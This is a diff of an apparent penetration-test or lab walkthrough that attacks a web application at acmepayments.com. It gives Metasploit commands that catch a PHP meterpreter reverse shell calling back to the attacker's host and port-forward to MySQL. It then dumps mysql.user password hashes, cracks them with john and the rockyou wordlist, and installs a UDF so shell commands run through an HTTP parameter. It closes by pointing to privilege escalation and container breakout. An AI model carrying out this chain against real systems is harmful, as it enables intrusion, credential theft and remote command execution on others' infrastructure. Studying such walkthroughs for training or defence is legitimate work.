@@ -4,7 +4,13 @@
 4. msfconsole; use multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $MYIP; exploit;
 5. in another window use curl or a browser to land on the uploaded msfvenom staged payload
 6. back in msconsole; sysinfo; echo $pwd; ls; cat api/index.php; portfwd add -l 33306 -p 3306 -r mysql;
-7. new msfconsole; use multi/mysql/mysql_udf_payload; set RHOST $MYIP; set USERNAME $user; set PASSWORD $pass; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $MYIP; (may not work UDF is geared towards < 5.5.9 @ Windows ...)
+7. mysql user does not have the needed permissions to further exploit and latterally move to the DB service but; can SELECT on mysq.users; _maybe_ another user does.
+8. SELECT user, host, authentication_string FROM mysql.user; show root@% exists, take authentication_String run through: john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/pass
+9. root user password is now known, through the portfwd login to MySQL using the root credentials; now we have the needed access to install the UDF for shell execution.
+10. So the data flow is now, http://acmepayments.com/api/?action=sys_eval($cmd) -> MySQL service execute $cmd as MySQLuser on host -> return result
+11. shell commands in the MySQL procotol, communicted through PHP through HTTP protocol, back to the adversary.
+12. next steps (intelleigent) may be to further serivce / host priv escalate or breakout the containers, $greedy opportunists instead opt for noisy operations which ultimately gets them caught.
 
+ 
 
 FALLBACK: Talk to this video: https://www.youtube.com/watch?v=e29kbX-rx0s 
